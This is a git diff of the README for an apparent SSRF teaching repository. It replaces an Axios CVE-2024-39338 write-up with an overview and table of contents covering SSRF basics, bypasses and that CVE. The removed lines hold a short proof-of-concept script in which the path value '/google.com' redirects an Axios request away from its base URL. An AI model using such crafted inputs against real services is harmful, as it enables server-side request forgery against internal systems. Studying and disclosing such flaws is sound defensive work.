@@ -1,30 +1,12 @@
-# Axios SSRF Vulnerability CVE-2024-39338
+# SSRF Demonstration and Discussion w/ Axios
 
-Effected versions: >=1.3.2 <1.7.4
+This repository is a demonstration of Server-Side Request Forgery (SSRF) vulnerabilities in web applications. It includes a brief overview of SSRF, common defenses, and how to bypass them. The repository also includes a demonstration of an SSRF vulnerability in the popular Axios library.
 
-[Snyk Vuln](https://security.snyk.io/vuln/SNYK-JS-AXIOS-7361793)
-[GitHub Issue](https://github.com/axios/axios/issues/6295)
-[GitHub PR](https://github.com/axios/axios/pull/6539)
+TOC:
+- [SSRF 101](#docs/SSRF_101.md)
+- [SSRF Bypass](#docs/SSRF_bypass.md)
+- [Axios SSRF Vulnerability CVE-2024-39338](#docs/Axios_SSRF_vuln.md)
 
-## Demo
-
-```js
-const axios = require('axios');
-
-this.axios = axios.create({
-  baseURL: 'https://userapi.example.com',
-});
-
-//userId = '12345';
-userId = '/google.com'
-
-this.axios.get(`/${userId}`).then(function (response) {
-  console.log(`config.baseURL:  ${response.config.baseURL}`);
-  console.log(`config.method:   ${response.config.method}`);
-  console.log(`config.url:      ${response.config.url}`);
-  console.log(`res.responseUrl: ${response.request.res.responseUrl}`);
-});
-```
 
 ## Sources / Credits:
 - [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
